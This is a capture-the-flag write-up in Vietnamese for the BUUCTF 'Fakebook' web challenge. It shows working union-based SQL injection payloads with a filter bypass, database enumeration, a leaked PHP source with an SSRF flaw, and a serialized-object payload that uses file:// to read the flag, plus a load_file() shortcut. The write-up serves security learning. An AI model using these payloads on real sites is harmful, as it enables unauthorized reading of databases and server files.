# [网鼎杯 2018]Fakebook

Challenge cho ta trang web có 2 chức năng join và login.Đầu tiên mình thử join

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/e11fcf2f-bfcf-4b3e-acc3-f83787f48aa1)

Sau đó thì mình kiểm tra phần username thì thấy rằng có 1 method GET được tạo ở file `view.php` với tham số `no = 1`.Theo mình nghĩ thì là có sqli

Đầu tiên thử các payload boolean đơn giản.

`and 1=1 union select 1,2,3,4`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/e131f95b-78ed-4641-ae7c-a2c8a0df6120)

Và có kết quả trả ra mình thử inject thêm để xem có database hay gì quan trọng không.Sau khi thử các payload khác nhưng đều ko cho ra kết quả ví đã bị filter.
Nên mình chuyển sang `and 1=2 union/**/select 1,2,3,4#`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/34192d6d-299e-4787-bb00-319f6ada09ff)

Và kết quả trả ra có lỗi ở cột 2, xuất hiên deserialize dể đọc flag ở file `/var/www/html/view.php`.Tiếp tục inject.

```
1. and 1=2 union/**/select 1,database(),3,4# ---> facebook
2. and 1=2 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='facebook'# ---> user
3. and 1=2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#  --->no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
4. and 1=2 union/**/select 1,group_concat(data),3,4 from users# ---> O:8:"UserInfo":3:{s:4:"name";s:4:"lama";s:3:"age";i:20;s:4:"blog";s:10:"123123.com";}
```

Ở payload thì kết quả trả ra là deserialize string. Sau đó thì mình đi scan file bằng dirsearch. 

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/9d7aed59-fb5f-4876-97ac-f0f1ce54d927)

Wget `robots.txt` thì cho ra đường dẫn tới file khác `user.php.bak`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/7b074c6d-d236-44b0-a0bd-d80c9d6661b1)

Sau đó thì ta có được source code.

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();//Hàm này khởi tạo một phiên cURL, được sử dụng bởi các hàm curl_setopt(), curl_exec() và curl_close().

        curl_setopt($ch, CURLOPT_URL, $url);//Hàm này được sử dụng để thiết lập các tùy chọn cho việc truyền dữ liệu bằng cURL. CURLOPT_URL đại diện cho địa chỉ URL cần truy cập, tiếp theo là giá trị của nó.
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//Tùy chọn này, khi được thiết lập, làm cho curl_exec() trả về phản hồi dưới dạng một chuỗi thay vì trực tiếp hiển thị nó.
        $output = curl_exec($ch);//Hàm này trả về TRUE nếu thành công hoặc FALSE nếu thất bại. Tuy nhiên, nếu tùy chọn CURLOPT_RETURNTRANSFER được thiết lập, nó trả về kết quả thực thi nếu thành công hoặc FALSE nếu thất bại.
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);//Hằng số này đại diện cho mã HTTP cuối cùng nhận được. curl_getinfo được sử dụng để lấy giá trị này dưới dạng chuỗi. Vì đã thiết lập CURLINFO_HTTP_CODE, nó trả về mã trạng thái.Nếu mã trạng thái không phải là 404, kết quả của việc thực thi sẽ được trả về.
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

## Review code

Sau khi đọc xong, mình phát hiện thêm lỗi SSRF ở get() function.Và có cả `__construct` nên chắc chắn rằng có liên quan đến serilization.

Tiếp đó là func `getBlogContents()`.Ở đây rõ ràng là tham số được truyền là "blog".Vậy thì ta sẽ input vào blog vì desrerilizatMình sẽ viết lại cho dễ hiểu

```php
class BlogReader
{
    private $blog;

    function __construct($blog)
    {
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents()
    {
        // Lỗi bảo mật: Không kiểm tra đầu vào người dùng $this->blog
        // và không kiểm tra URL trước khi thực hiện yêu cầu.
        return $this->get($this->blog);
    }

    public function isValidBlog()
    {
        // Lỗi bảo mật: Sử dụng regex để kiểm tra URL không đủ an toàn.
        // Điều này có thể bị lợi dụng để chèn SSRF.
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}

// Sử dụng lớp BlogReader
$blogReader = new BlogReader("http://example.com");
$contents = $blogReader->getBlogContents();
echo $contents;
```

1. Không kiểm tra đầu vào người dùng trong getBlogContents: Hàm getBlogContents không kiểm tra đầu vào người dùng $this->blog, điều này có thể dẫn đến lỗ hổng SSRF nếu attacker cung cấp một URL độc hại.

2. Sử dụng regex để kiểm tra URL trong isValidBlog: Sử dụng regex để kiểm tra URL có thể không đủ an toàn và có thể bị lợi dụng để chèn SSRF. Cần có các kiểm tra bảo mật mạnh mẽ hơn để đảm bảo rằng URL được chấp nhận là an toàn.

## Conclusion

Chúng ta có thể sử dụng giao thức file để đọc các tệp cục bộ. Nếu bạn không biết nhiều về giao thức file, vui lòng tham khảo bài viết này: https://blog.csdn.net/github_39319000/article/details/86523282

Nó có thể được truy cập như sau: `file://var/www/html/flag.php`

Hãy quay lại và xem serialized string sau khi inject payload, từ đó chúng ta có thể biết rằng thông tin đăng ký của chúng ta được lưu trữ dưới dạng deserialized string.

Nó được lưu trữ trong trường dữ liệu ở serialized mode, và serialized string được trả về trong quá trình truy vấn, sau đó địa chỉ URL của `blog` được giải chuỗi trước tiên.

```solve.php
<?php
class UserInfo
{
    public $name = "1";
    public $age = 20;
    public $blog = "file://var/www/html/flag.php";

}

$a = new UserInfo();
echo serialize($a);
?>
//output:O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:20;s:4:"blog";s:28:"file://var/www/html/flag.php";}
```

Payload
```
and 1=2 union/**/select 1,2,3, 'O:8:"UserInfo":3:{s:4:"name";s:4:"lama";s:3:"age";i:20;s:4:"blog";s:28:"file://var/www/html/flag.php";}'#
```

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/1e6e1613-3243-495f-ac1e-56e0c1ead141)

## Cách 2

Bạn có thể dùng payload `load_file()` sẽ nhanh hơn

`and 1=2 union/**/select 1,load_file("/var/www/html/flag.php"),3,4#`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/08ab1013-806f-4885-a249-849a853598b4)

